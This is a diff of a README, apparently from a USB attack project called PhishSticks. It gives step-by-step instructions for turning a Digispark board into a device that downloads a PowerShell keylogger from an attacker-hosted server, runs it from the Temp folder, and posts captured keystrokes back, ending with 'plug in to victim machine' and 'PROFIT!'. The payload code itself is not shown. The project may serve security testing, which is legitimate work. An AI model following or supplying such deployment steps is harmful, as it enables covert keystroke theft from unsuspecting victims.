@@ -19,16 +19,15 @@ Currently we are using the [one with the POST request](https://github.com/therea
 - Check [DigiKeyboardFi](https://github.com/therealhalonen/DigiKeyboardFi) for support it.    
 - Download the .ino, or copy the code.    
 - Open the file or paste the content to/in Arduino IDE.
-- Grab the [keylogger script](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/keylogger/keylog_ps/helper_post.ps1)
+- Grab the [keylogger script](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/keylogger/keylog_ps/helper_post.ps1)3
 - Edit the script, [with instructions](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/keylogger/keylog_ps#how-to-use-1)
 - Host/serve the script from your preferred location
 	- For example straight from attack device with simple python `python3 -m http.server PORT`
+	- OR using our [simple Flask app](scripts/webhook), that is designed to be used in our testings, with the keylogger.
 - Define:
-	-  `DownloadFile('URL_DEFINED_IN_PREVIOUS_step'`    
-	**NOTE: As is (`https://tinyurl.com/588af6f2`), it downloads it from [here](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/keylogger/keylog_ps/helper_post.ps1), which will end up sending the POST reguest to non-existing endpoint**   
-	
+	-  `DownloadFile('FULL_ADDRESS_WITH_FILENAME'`, the one you are serving the payload from.    
 	- Path, where to download and what to execute (both must be the same):
-		- `$env:Temp/SOMETHING.ps1\\\`   
+		- `$env:Temp\\FILE_NAME_OF_YOUR_CHOICE.ps1`   
 - Upload to Digispark
 - Plug in to victim machine
 - **PROFIT!**
